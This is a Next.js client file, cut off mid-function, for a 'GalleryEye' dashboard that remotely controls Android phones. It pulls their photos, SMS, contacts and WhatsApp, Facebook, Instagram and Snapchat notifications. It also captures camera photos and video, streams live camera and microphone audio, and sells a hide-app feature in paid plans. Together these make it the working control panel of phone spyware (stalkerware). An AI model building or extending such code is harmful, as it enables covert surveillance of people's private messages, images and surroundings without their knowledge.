"use client";

import { useSession, signOut } from "next-auth/react";
import { useEffect, useState, useMemo, useRef, useCallback } from "react";
import Image from "next/image";
import io from "socket.io-client";
import AppGenerationModal from "@/components/AppGenerationModal";
import WhatsAppButton from "@/components/WhatsAppButton";
import PlanBadge from "@/components/PlanBadge";
import UpgradeModal from "@/components/UpgradeModal";
import PlansModal from "@/components/PlansModal";
import BulkDownloadModal from "@/components/BulkDownloadModal";
import SyncOptionsModal from "@/components/SyncOptionsModal";
import ZipProgressModal from "@/components/ZipProgressModal";
import CustomAlertModal from "@/components/CustomAlertModal";
import { motion, AnimatePresence } from "framer-motion";
import { 
    Image as ImageIcon, MessageSquare, Users, Flashlight, Vibrate, Camera, 
    Bell, Mic, Settings, LogOut, Smartphone, Download, Menu, X, ChevronDown, 
    Check, Play, Square, Video, RefreshCw, Search, Trash2, CheckSquare 
} from 'lucide-react';
import AppNavigation from "@/components/AppNavigation";
import GalleryView from "@/components/views/GalleryView";

let socket: any = null;

interface PlanLimits {
    photos: number;
    videos: number;
    sms: boolean;
    contacts: boolean;
    torch: boolean;
    vibration: boolean;
    hideApp: boolean;
    bulkDownload?: boolean;
    maxDevices: number;
}

export default function Home() {
    const { data: session, status } = useSession();
    const [images, setImages] = useState<any[]>([]);
    const [galleryPage, setGalleryPage] = useState(1);
    const [galleryHasMore, setGalleryHasMore] = useState(true);
    const [isLoadingMore, setIsLoadingMore] = useState(false);
    const galleryLoaderRef = useRef<HTMLDivElement>(null);
    const [folders, setFolders] = useState([]);

    // Plan State
    const [userPlan, setUserPlan] = useState<'basic' | 'standard' | 'premium'>('basic');
    const [planLimits, setPlanLimits] = useState<PlanLimits>({
        photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, hideApp: false, maxDevices: 1
    });
    const [showUpgradeModal, setShowUpgradeModal] = useState(false);
    const [showPlansModal, setShowPlansModal] = useState(false);
    const [showBulkDownloadModal, setShowBulkDownloadModal] = useState(false);
    const [bulkDownloadFolder, setBulkDownloadFolder] = useState('');
    const [upgradeFeature, setUpgradeFeature] = useState('');
    const [requiredPlan, setRequiredPlan] = useState<'standard' | 'premium'>('standard');

    // ZIP Download State
    const [showSyncOptionsModal, setShowSyncOptionsModal] = useState(false);
    const [showZipProgressModal, setShowZipProgressModal] = useState(false);
    const [syncOptionsFolder, setSyncOptionsFolder] = useState({ name: '', count: 0, type: 'image' as 'image' | 'video' });
    const [zipProgress, setZipProgress] = useState({ stage: 'creating' as 'creating' | 'uploading' | 'ready' | 'error', current: 0, total: 0, url: '', error: '' });
    const [zipFiles, setZipFiles] = useState<{ folderName: string, url: string, fileCount: number, timestamp: Date }[]>([]);
    
    // Multi-Device State
    const [devices, setDevices] = useState<any[]>([]);
    const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
    const [isDeviceDropdownOpen, setIsDeviceDropdownOpen] = useState(false);

    // Initialize state from localStorage after mount to avoid hydration mismatch
    useEffect(() => {
        try {
            const savedDevice = localStorage.getItem('selectedDeviceId');
            if (savedDevice) setSelectedDeviceId(savedDevice);
            
            const savedZip = localStorage.getItem('galleryeye_zipFiles');
            if (savedZip) {
                setZipFiles(JSON.parse(savedZip).map((z: any) => ({ ...z, timestamp: new Date(z.timestamp) })));
            }
        } catch (e) {
            console.error('Failed to load cached state', e);
        }
    }, []);

    // Persist selected device to localStorage
    useEffect(() => {
        if (selectedDeviceId) {
            localStorage.setItem('selectedDeviceId', selectedDeviceId);
        } else {
            localStorage.removeItem('selectedDeviceId');
        }
    }, [selectedDeviceId]);

    const [uploadProgress, setUploadProgress] = useState<any>(null);
    const [showAppModal, setShowAppModal] = useState(false);
    const [selectedFolder, setSelectedFolder] = useState<any>(null);

    // New State for Gallery Features
    const [activeTab, setActiveTab] = useState<'all' | 'image' | 'video' | 'zip'>('all');
    const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
    
    // Sync session plan if available
    useEffect(() => {
        if (session && (session.user as any)?.plan) {
            setUserPlan((session.user as any).plan.toLowerCase() as any);
        }
    }, [session]);

    const [previewItem, setPreviewItem] = useState<any>(null);
    const [isSelectionMode, setIsSelectionMode] = useState(false);
    const [isDownloading, setIsDownloading] = useState(false);
    const [isDeleting, setIsDeleting] = useState(false);
    const [isScrolled, setIsScrolled] = useState(false);

    useEffect(() => {
        const handleScroll = () => {
            setIsScrolled(window.scrollY > 20);
        };
        window.addEventListener('scroll', handleScroll);
        return () => window.removeEventListener('scroll', handleScroll);
    }, []);
    const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);

    // Tool Selector State
    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications' | 'audio' | null>(null);
    const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);

    // Torch State
    const [isTorchOn, setIsTorchOn] = useState(false);
    const [torchAggressive, setTorchAggressive] = useState(false);
    const [torchDuration, setTorchDuration] = useState(60000); // 1 minute default

    // Vibration State
    const [vibrationDuration, setVibrationDuration] = useState(1000); // 1 second default

    // Sync State
    const [isStartingSync, setIsStartingSync] = useState(false);

    // SMS State
    const [smsList, setSmsList] = useState<any[]>([]);
    const [isFetchingSms, setIsFetchingSms] = useState(false);
    const [selectedSms, setSelectedSms] = useState<any>(null);
    const [smsSearchQuery, setSmsSearchQuery] = useState('');

    // Contacts State
    const [contactsList, setContactsList] = useState<any[]>([]);
    const [isFetchingContacts, setIsFetchingContacts] = useState(false);
    const [contactsSearchQuery, setContactsSearchQuery] = useState('');

    // Notification Monitoring State
    const [notifications, setNotifications] = useState<any[]>(() => {
        if (typeof window !== 'undefined') {
            try {
                const saved = localStorage.getItem('galleryeye_notifications');
                if (saved) return JSON.parse(saved);
            } catch { }
        }
        return [];
    });
    const [isMonitoringNotifications, setIsMonitoringNotifications] = useState(false);
    const [selectedNotification, setSelectedNotification] = useState<any>(null);
    const [notificationSearch, setNotificationSearch] = useState('');
    const [selectedNotifApp, setSelectedNotifApp] = useState<string>('all');

    // App filter definitions for notification section
    const notifAppFilters = [
        { key: 'all', label: 'All', packages: [], color: '#06b6d4', img: '' },
        { key: 'whatsapp', label: 'WhatsApp', packages: ['com.whatsapp'], color: '#25D366', img: 'https://img.icons8.com/color/48/000000/whatsapp--v1.png' },
        { key: 'facebook', label: 'Facebook', packages: ['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite'], color: '#1877F2', img: 'https://img.icons8.com/color/48/000000/facebook-new.png' },
        { key: 'instagram', label: 'Instagram', packages: ['com.instagram.android'], color: '#E4405F', img: 'https://img.icons8.com/fluency/48/000000/instagram-new.png' },
        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'https://img.icons8.com/color/48/000000/whatsapp--v1.png' },
        { key: 'snapchat', label: 'Snapchat', packages: ['com.snapchat.android'], color: '#FFFC00', img: 'https://img.icons8.com/color/48/000000/snapchat.png' },
    ];

    // Settings Modal State
    const [isSettingsOpen, setIsSettingsOpen] = useState(false);
    const [devicePermissions, setDevicePermissions] = useState<any>(null);

    // Profile Menu State (Mobile)
    const [isProfileMenuOpen, setIsProfileMenuOpen] = useState(false);

    // Camera State
    const [cameraMode, setCameraMode] = useState<'front' | 'back'>('back');
    const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
    const [isRecording, setIsRecording] = useState(false);
    const [isLiveStreaming, setIsLiveStreaming] = useState(false);
    const [liveFrame, setLiveFrame] = useState<string | null>(null);
    const [recordingDuration, setRecordingDuration] = useState(60); // Default 1 min
    const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
    const [capturedMedia, setCapturedMedia] = useState<{ type: string; data: string; camera: string; timestamp: number }[]>([]);
    const [cameraError, setCameraError] = useState<string | null>(null);
    const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
    const [streamQuality, setStreamQuality] = useState(360); // 144, 240, 360, 480, 720
    const [isFullscreen, setIsFullscreen] = useState(false);
    const [isVideoUploading, setIsVideoUploading] = useState(false);
    const [previewCapture, setPreviewCapture] = useState<{ type: string; data: string } | null>(null);

    // Live Audio State
    const [isLiveAudio, setIsLiveAudio] = useState(false);
    const [audioVolume, setAudioVolume] = useState(80);
    const [isMuted, setIsMuted] = useState(false);
    const [audioLevel, setAudioLevel] = useState(0);
    const [audioElapsed, setAudioElapsed] = useState(0);

    // Voice Recording State
    const [isVoiceRecording, setIsVoiceRecording] = useState(false);
    const [voiceRecDuration, setVoiceRecDuration] = useState(60); // seconds
    const [voiceRecProgress, setVoiceRecProgress] = useState({ current: 0, total: 0 });
    const [voiceRecordings, setVoiceRecordings] = useState<{ url: string; duration: number; timestamp: number }[]>([]);
    const [playingRecUrl, setPlayingRecUrl] = useState<string | null>(null);
    const voiceRecTimerRef = useRef<NodeJS.Timeout | null>(null);
    const isLiveAudioRef = useRef<boolean>(false);
    const [audioError, setAudioError] = useState<string | null>(null);
    const audioContextRef = useRef<AudioContext | null>(null);
    const audioGainRef = useRef<GainNode | null>(null);
    const audioAnalyserRef = useRef<AnalyserNode | null>(null);
    const audioCanvasRef = useRef<HTMLCanvasElement | null>(null);
    const audioAnimFrameRef = useRef<number>(0);
    const audioTimerRef = useRef<NodeJS.Timeout | null>(null);
    // Ring Buffer for continuous audio playback (like phone calls)
    // Sized at startLiveAudio() based on the actual ctx.sampleRate (browsers ignore the 16000 hint on Windows/macOS).
    const audioRingBufRef = useRef<Float32Array>(new Float32Array(48000 * 10));
    const audioRingWriteRef = useRef<number>(0);
    const audioRingReadRef = useRef<number>(0);
    const audioRingSamplesRef = useRef<number>(0);
    const audioProcessorRef = useRef<ScriptProcessorNode | null>(null);
    // Source rate from device (Android sends 16kHz PCM). Output rate is whatever the browser gives us.
    const audioSrcRateRef = useRef<number>(16000);
    const audioOutRateRef = useRef<number>(48000);
    // Cubic interpolation resampler state
    const audioResampPosRef = useRef<number>(0);
    const audioResampHistRef = useRef<Float32Array>(new Float32Array(4)); // s0,s1,s2,s3 for cubic
    const audioResampHistIdxRef = useRef<number>(0);
    // Jitter-buffer warm-up: don't start pulling until we have ~300ms queued, and hold last sample on underrun (PLC)
    const audioWarmedRef = useRef<boolean>(false);
    const audioLastSampleRef = useRef<number>(0);
    const audioUnderrunCountRef = useRef<number>(0);

    // Custom Alert Modal State
    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    // Helper function to show upgrade modal
    const showUpgradePrompt = (feature: string, required: 'standard' | 'premium') => {
        setUpgradeFeature(feature);
        setRequiredPlan(required);
        setShowUpgradeModal(true);
    };

    // 3D tilt effect for tool cards
    const handle3DTilt = (e: React.MouseEvent<HTMLElement>) => {
        const inner = e.currentTarget.querySelector('[data-tilt-inner]') as HTMLElement;
        if (!inner) return;
        const rect = e.currentTarget.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width - 0.5) * 2;
        const y = ((e.clientY - rect.top) / rect.height - 0.5) * -2;
        inner.style.transform = `perspective(800px) rotateY(${x * 8}deg) rotateX(${y * 8}deg) translateZ(8px)`;
    };

    const reset3DTilt = (e: React.MouseEvent<HTMLElement>) => {
        const inner = e.currentTarget.querySelector('[data-tilt-inner]') as HTMLElement;
        if (inner) inner.style.transform = 'perspective(800px) rotateY(0deg) rotateX(0deg) translateZ(0px)';
    };

    // Fetch user plan on authentication
    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/user/plan?uuid=${session.user.uuid}`)
                .then(res => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                .then(data => {
                    if (data.plan) {
                        setUserPlan(data.plan);
                        setPlanLimits(data.limits);
                    }
                })
                .catch(e => console.error('[Plan] Fetch error:', e));
        }
    }, [status, session?.user?.uuid]);

    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            const uuid = session.user.uuid;

            if (socket && socket.connected) return;
            if (socket) {
                socket.disconnect();
                socket = null;
            }

            socket = io("https://p01--gallery-eye--9zr85m7yb6s4.code.run", {
                transports: ["websocket", "polling"],
                reconnection: true,
                reconnectionAttempts: Infinity,
                reconnectionDelay: 2000,
                reconnectionDelayMax: 30000,
            });

            let lastConnectFetch = 0;

            socket.on("connect", () => {
                console.log("[Socket] Connected/Reconnected, registering web...");
                socket.emit("register_web", { uuid });

                const now = Date.now();
                if (now - lastConnectFetch < 10000) return;
                lastConnectFetch = now;

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}`)
                    .then(res => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then(data => {
                        if (data.notifications && data.notifications.length > 0) {
                            setNotifications((prev: any[]) => {
                                const existingIds = new Set(prev.map(n => n.id));
                                const newNotifs = data.notifications
                                    .filter((n: any) => !existingIds.has(n.id))
                                    .map((n: any) => ({
                                        ...n,
                                        receivedAt: new Date(n.savedAt).getTime()
                                    }));
                                
                                if (newNotifs.length === 0) return prev;
                                
                                const updated = [...newNotifs, ...prev]
                                    .sort((a, b) => (b.receivedAt || b.timestamp) - (a.receivedAt || a.timestamp))
                                    .slice(0, 1000);
                                
                                try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                                return updated;
                            });
                        }
                    })
                    .catch(e => console.error('[Notifications] Fetch error:', e));
            });

            socket.on("disconnect", (reason: string) => {
                console.log("[Socket] Disconnected:", reason);
            });

            socket.on("connect_error", (err: any) => {
                console.log("[Socket] Connect error:", err?.message || err);
            });

            socket.on("device_list_update", (deviceList: any[]) => {
                setDevices(deviceList);

                const onlineDevices = deviceList.filter(d => d.online);
                if (onlineDevices.length > 0) {
                    setSelectedDeviceId(prev => {
                        // If we have a selection and it's still online, keep it
                        const stillOnline = onlineDevices.find(d => d.deviceId === prev);
                        if (stillOnline) return prev;
                        // Check localStorage for a previously saved device
                        const savedId = localStorage.getItem('selectedDeviceId');
                        if (savedId) {
                            const savedOnline = onlineDevices.find(d => d.deviceId === savedId);
                            if (savedOnline) return savedId;
                        }
                        // Otherwise select the first online device
                        return onlineDevices[0].deviceId;
                    });
                } else {
                    setSelectedDeviceId(null);
                }
            });

            socket.on("progress_update", (data: any) => {
                setIsStartingSync(false); // Stop starting animation when progress begins
                setUploadProgress(data);
                if (data.uploaded === data.total) {
                    setTimeout(() => {
                        setUploadProgress(null);
                        // Trigger a refetch of images now that sync is complete
                        if (typeof window !== 'undefined' && (window as any).fetchGalleryData) {
                            (window as any).fetchGalleryData();
                        }
                    }, 3000);
                }
            });

            socket.on("new_image", (image: any) => {
                setImages((prev) => {
                    if (prev.some(img => img.id === image.id)) return prev;
                    return [image, ...prev];
                });
            });

            socket.on("folder_list", (data: any) => {
                setFolders(data);
            });

            // ZIP Download Event Listeners
            socket.on("zip_progress", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: data.stage,
                    current: data.current,
                    total: data.total
                }));
            });

            socket.on("zip_ready", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'ready',
                    url: data.url
                }));
                // Add ZIP to files list and persist
                setZipFiles(prev => {
                    const updated = [{
                        folderName: data.folderName || 'Download',
                        url: data.url,
                        fileCount: data.fileCount || 0,
                        timestamp: new Date()
                    }, ...prev];
                    try { localStorage.setItem('galleryeye_zipFiles', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("zip_error", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'error',
                    error: data.error
                }));
            });

            // SMS Event Listeners
            socket.on("sms_list", (data: any) => {
                setIsFetchingSms(false);
                if (data.isIncremental && data.sms?.length > 0) {
                    // Merge new SMS with existing, avoiding duplicates
                    setSmsList((prev) => {
                        const existingIds = new Set(prev.map(s => s.id));
                        const newSms = data.sms.filter((s: any) => !existingIds.has(s.id));
                        return [...newSms, ...prev];
                    });
                } else if (data.sms) {
                    setSmsList(data.sms);
                }
            });

            socket.on("sms_error", (data: any) => {
                setIsFetchingSms(false);
                setAlertData({
                    title: 'SMS Permission Required',
                    message: data.message || 'Failed to fetch SMS. Please enable SMS permission in the App settings.',
                    type: 'error'
                });
                setShowCustomAlert(true);
            });

            // Contacts Event Listeners
            socket.on("contacts_list", (data: any) => {
                setIsFetchingContacts(false);
                if (data.contacts) {
                    setContactsList(data.contacts);
                }
            });

            socket.on("contacts_error", (data: any) => {
                setIsFetchingContacts(false);
                setAlertData({
                    title: 'Contacts Permission Required',
                    message: data.message || 'Failed to fetch contacts. Please enable Contacts permission in the App settings.',
                    type: 'error'
                });
                setShowCustomAlert(true);
            });

            // Notification Monitoring Event Listeners
            socket.on("new_notification", (data: any) => {
                setNotifications(prev => {
                    const updated = [{ ...data, receivedAt: Date.now() }, ...prev].slice(0, 1000);
                    try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("notification_dismissed", (data: any) => {
                setNotifications(prev => {
                    const updated = prev.map(n => n.id === data.id ? { ...n, dismissed: true } : n);
                    try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("notification_monitor_status", (data: any) => {
                if (!data.enabled) {
                    // Only show popup if user is actively on the notifications tool
                    setIsMonitoringNotifications(false);
                } else {
                    setIsMonitoringNotifications(true);
                }
            });

            socket.on("notification_error", (data: any) => {
                setIsMonitoringNotifications(false);
            });

            // Permission Check Response
            socket.on("permission_status", (data: any) => {
                setIsCheckingPermissions(false);
                setDevicePermissions(data.permissions);
            });

            socket.on("photo_capture_ack", (data: any) => {
                if (data.status === 'captured') {
                    setIsCapturingPhoto(false);
                }
            });

            socket.on("camera_photo", (data: any) => {
                setIsCapturingPhoto(false);
                if (data.image) {
                    setCapturedMedia(prev => [{
                        type: 'photo',
                        data: data.image,
                        camera: data.camera || 'back',
                        timestamp: data.timestamp || Date.now()
                    }, ...prev]);
                }
            });

            socket.on("camera_video", (data: any) => {
                setIsRecording(false);
                setIsVideoUploading(false);
                setRecordingProgress({ current: 0, total: 0 });
                if (data.video) {
                    setCapturedMedia(prev => [{
                        type: 'video',
                        data: data.video,
                        camera: data.camera || 'back',
                        timestamp: data.timestamp || Date.now()
                    }, ...prev]);
                }
            });

            socket.on("live_frame", (data: any) => {
                if (data.frame) {
                    setLiveFrame(data.frame);
                }
            });

            socket.on("recording_progress", (data: any) => {
                const current = data.current || 0;
                const total = data.total || 0;
                setRecordingProgress({ current, total });
                // When recording finishes automatically, trigger upload status
                if (current >= total && total > 0) {
                    setIsRecording(false);
                    setIsVideoUploading(true);
                }
            });

            socket.on("gallery_error", (data: any) => {
                const errorMessage = data.message || "Gallery error occurred";
                if (errorMessage.includes("Permission Denied")) {
                    setAlertData({
                        title: 'Gallery Permission Required',
                        message: 'Please enable Storage/Gallery permission in the App settings to sync media.',
                        type: 'error'
                    });
                } else {
                    setAlertData({
                        title: 'Gallery Error',
                        message: errorMessage,
                        type: 'error'
                    });
                }
                setShowCustomAlert(true);
            });

            socket.on("camera_error", (data: any) => {
                setIsCapturingPhoto(false);
                setIsRecording(false);
                const errorMessage = data.error || "Camera error occurred";
                setCameraError(errorMessage);

                if (errorMessage.includes("Permission Denied")) {
                    alert(`${errorMessage}\n\nPlease enable Camera permission in the App settings.`);
                } else {
                    setTimeout(() => setCameraError(null), 5000);
                }
            });

            // Live Audio â€” Ring Buffer Writer with cubic-interpolation resampling.
            // Incoming PCM is 16kHz from the device, but AudioContext usually runs at 48kHz
            // (browsers ignore the sampleRate hint on Windows/macOS). Without resampling here,
            // playback was effectively 3x too fast â†’ constant underruns â†’ choppy/clicky sound.
            socket.on("live_audio", (data: any) => {
                if (!data.chunk) return;
                if (!isLiveAudioRef.current) return;

                // Auto-create AudioContext on first chunk â€” playback starts as soon as device sends audio
                if (!audioContextRef.current) {
                    try {
                        const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
                        const outRate = ctx.sampleRate;
                        const gainNode = ctx.createGain();
                        const analyser = ctx.createAnalyser();
                        analyser.fftSize = 256;
                        gainNode.gain.value = 0.8;
                        gainNode.connect(analyser);
                        analyser.connect(ctx.destination);

                        const processor = ctx.createScriptProcessor(2048, 0, 1);

                        audioRingBufRef.current = new Float32Array(Math.ceil(outRate * 10));
                        audioRingWriteRef.current = 0;
                        audioRingReadRef.current = 0;
                        audioRingSamplesRef.current = 0;
                        audioSrcRateRef.current = 16000;
                        audioOutRateRef.current = outRate;
                        audioResampPosRef.current = 0;
                        audioResampHistRef.current = new Float32Array(4);
                        audioResampHistIdxRef.current = 0;
                        audioWarmedRef.current = false;
                        audioLastSampleRef.current = 0;
                        audioUnderrunCountRef.current = 0;

                        const warmupSamples = Math.floor(outRate * 0.3);

                        processor.onaudioprocess = (e: AudioProcessingEvent) => {
                            const output = e.outputBuffer.getChannelData(0);
                            const ring = audioRingBufRef.current;
                            const capacity = ring.length;

                            if (!audioWarmedRef.current) {
                                if (audioRingSamplesRef.current >= warmupSamples) {
                                    audioWarmedRef.current = true;
                                    audioUnderrunCountRef.current = 0;
                                } else {
                                    output.fill(0);
                                    return;
                                }
                            }

                            for (let i = 0; i < output.length; i++) {
                                if (audioRingSamplesRef.current > 0) {
                                    const s = ring[audioRingReadRef.current];
                                    output[i] = s;
                                    audioLastSampleRef.current = s;
                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
                                    audioRingSamplesRef.current--;
                                    audioUnderrunCountRef.current = 0;
                                } else {
                                    audioUnderrunCountRef.current++;
                                    const decayed = audioLastSampleRef.current * 0.97;
                                    output[i] = decayed;
                                    audioLastSampleRef.current = decayed;
                                    if (audioUnderrunCountRef.current > Math.floor(outRate * 0.05)) {
                                        audioWarmedRef.current = false;
                                    }
                                }
                            }
                        };

                        processor.connect(gainNode);

                        audioContextRef.current = ctx;
                        audioGainRef.current = gainNode;
                        audioAnalyserRef.current = analyser;
                        audioProcessorRef.current = processor;

                        // Resume AudioContext if browser suspended it
                        if (ctx.state === 'suspended') ctx.resume();
                    } catch (e) {
                        console.error('[Audio] Failed to create AudioContext:', e);
                    }
                }

                try {
                    const binaryStr = atob(data.chunk);
                    const bytes = new Uint8Array(binaryStr.length);
                    for (let i = 0; i < binaryStr.length; i++) bytes[i] = binaryStr.charCodeAt(i);
                    const int16 = new Int16Array(bytes.buffer);

                    const ring = audioRingBufRef.current;
                    const capacity = ring.length;
                    const srcRate = audioSrcRateRef.current;
                    const outRate = audioOutRateRef.current;
                    const ratio = outRate / srcRate; // e.g. 48000/16000 = 3 output samples per input

                    const hist = audioResampHistRef.current;
                    let histIdx = audioResampHistIdxRef.current;
                    let pos = audioResampPosRef.current;

                    for (let i = 0; i < int16.length; i++) {
                        const sample = int16[i] / 32768.0;
                        // Push into history ring (4 samples for cubic: s0,s1,s2,s3)
                        hist[histIdx & 3] = sample;
                        histIdx++;

                        // Emit output samples using cubic (Catmull-Rom) interpolation
                        // We have enough history after 4+ samples pushed
                        if (histIdx >= 4) {
                            const s0 = hist[(histIdx - 4) & 3];
                            const s1 = hist[(histIdx - 3) & 3];
                            const s2 = hist[(histIdx - 2) & 3];
                            const s3 = hist[(histIdx - 1) & 3];

                            while (pos < 1.0) {
                                const t = pos;
                                const t2 = t * t;
                                const t3 = t2 * t;
                                // Catmull-Rom spline
                                const out = 0.5 * (
                                    (2 * s1) +
                                    (-s0 + s2) * t +
                                    (2 * s0 - 5 * s1 + 4 * s2 - s3) * t2 +
                                    (-s0 + 3 * s1 - 3 * s2 + s3) * t3
                                );
                                ring[audioRingWriteRef.current] = Math.max(-1, Math.min(1, out));
                                audioRingWriteRef.current = (audioRingWriteRef.current + 1) % capacity;
                                if (audioRingSamplesRef.current < capacity) {
                                    audioRingSamplesRef.current++;
                                } else {
                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
                                }
                                pos += 1.0 / ratio;
                            }
                            pos -= 1.0;
                        }
                    }
                    audioResampHistIdxRef.current = histIdx;
                    audioResampPosRef.current = pos;

                    // VU meter from the raw incoming 16k chunk
                    let sum = 0;
                    for (let i = 0; i < int16.length; i++) {
                        const s = int16[i] / 32768.0;
                        sum += s * s;
                    }
                    const rms = Math.sqrt(sum / int16.length);
                    setAudioLevel(Math.min(1, rms * 5));
                } catch (e) {
                    console.error('[Audio] Ring buffer write error:', e);
                }
            });

            socket.on("audio_error", (data: any) => {
                setIsLiveAudio(false);
                isLiveAudioRef.current = false;
                setAudioError(data.error || 'Audio error occurred');
                setTimeout(() => setAudioError(null), 5000);
            });

            // Voice Recording Ready â€” device finished recording, server uploaded to R2
            socket.on("voice_recording_ready", (data: any) => {
                if (data.url) {
                    setVoiceRecordings(prev => [{ url: data.url, duration: data.duration || 0, timestamp: data.timestamp || Date.now() }, ...prev]);
                }
                setIsVoiceRecording(false);
                setVoiceRecProgress({ current: 0, total: 0 });
                if (voiceRecTimerRef.current) {
                    clearInterval(voiceRecTimerRef.current);
                    voiceRecTimerRef.current = null;
                }
            });

            // Voice Recording Progress from device
            socket.on("voice_recording_progress", (data: any) => {
                if (data.current !== undefined) {
                    setVoiceRecProgress({ current: data.current, total: data.total || 60 });
                }
            });

            // Load cached images instantly for fast UX
            const GALLERY_CACHE_KEY = `gallery_images_${uuid}`;
            try {
                const cachedImages = localStorage.getItem(GALLERY_CACHE_KEY);
                if (cachedImages) {
                    const parsed = JSON.parse(cachedImages);
                    setImages(parsed);
                }
            } catch { /* ignore */ }

            // Define fetch function so it can be called later
            let isFetchingGallery = false;
            const fetchGallery = (loadPage = 1, append = false) => {
                if (isFetchingGallery) return;
                isFetchingGallery = true;
                if (append) setIsLoadingMore(true);
                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/images?uuid=${uuid}&page=${loadPage}&limit=50`)
                    .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then((data) => {
                        const items = data.items || (Array.isArray(data) ? data : []);
                        const hasMore = data.hasMore !== undefined ? data.hasMore : false;

                        if (append) {
                            setImages(prev => {
                                const existingIds = new Set(prev.map((i: any) => i.id));
                                const newItems = items.filter((i: any) => !existingIds.has(i.id));
                                return [...prev, ...newItems];
                            });
                        } else {
                            setImages(items);
                        }
                        setGalleryHasMore(hasMore);
                        setGalleryPage(loadPage);

                        try { localStorage.setItem(GALLERY_CACHE_KEY, JSON.stringify(items.slice(0, 100))); } catch { /* storage full */ }

                        const captures = items.filter((item: any) =>
                            item.id && (item.id.includes('capture_') || item.id.includes('video_'))
                        ).map((item: any) => ({
                            type: item.resource_type === 'video' || item.id.includes('video_') ? 'video' : 'photo',
                            data: item.url,
                            camera: item.id.includes('front') ? 'front' : 'back',
                            timestamp: new Date(item.created_at).getTime()
                        }));

                        if (captures.length > 0) {
                            setCapturedMedia(prev => {
                                const existingData = new Set(prev.map(p => p.data));
                                const newItems = captures.filter((c: any) => !existingData.has(c.data));
                                return [...newItems, ...prev];
                            });
                        }
                    })
                    .catch(e => console.error('[Gallery] Fetch error:', e))
                    .finally(() => { isFetchingGallery = false; setIsLoadingMore(false); });
            };

            // Expose globally securely for the socket event
            (window as any).fetchGalleryData = fetchGallery;

            // Initial fetch
            fetchGallery();

            return () => {
                if (socket) {
                    socket.disconnect();
                    socket = null;
                }
                delete (window as any).fetchGalleryData;
            };
        }
    }, [status, session?.user?.uuid]);

    useEffect(() => {
        const loader = galleryLoaderRef.current;
        if (!loader || !galleryHasMore) return;
        const observer = new IntersectionObserver((entries) => {
            if (entries[0].isIntersecting && galleryHasMore && !isLoadingMore && (window as any).fetchGalleryData) {
                (window as any).fetchGalleryData(galleryPage + 1, true);
            }
        }, { rootMargin: '200px' });
        observer.observe(loader);
        return () => observer.disconnect();
    }, [galleryHasMore, galleryPage, isLoadingMore]);

    const fetchFolders = () => {
        if (socket && selectedDeviceId) {
            socket.emit("get_folders", {
                uuid: session?.user?.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    const handleFolderClick = (folder: any) => {
        // Prevent clicking while upload is in progress
        if (uploadProgress) {
            alert("Please wait for the current sync to complete.");
            return;
        }
        setSelectedFolder(folder);
        setSyncMediaType(null); // Reset media type selection
    };

    // SMS Functions
    const fetchSms = () => {
        // Plan check - SMS requires Standard or Premium
        if (!planLimits.sms) {
            showUpgradePrompt('SMS Access', 'standard');
            return;
        }
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsFetchingSms(true);
            socket.emit("get_sms", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    const resetSmsSync = () => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit("reset_sms_sync", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
            setSmsList([]);
        }
    };

    // Contacts Functions
    const fetchContacts = () => {
        // Plan check - Contacts requires Standard or Premium
        if (!planLimits.contacts) {
            showUpgradePrompt('Contacts Access', 'standard');
            return;
        }
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsFetchingContacts(true);
            socket.emit("get_contacts", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    // Permission Check Function
    const checkPermissions = () => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsCheckingPermissions(true);
            setDevicePermissions(null);
            socket.emit("check_permissions", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    // Filtered SMS based on search
    const filteredSms = useMemo(() => {
        if (!smsSearchQuery) return smsList;
        const query = smsSearchQuery.toLowerCase();
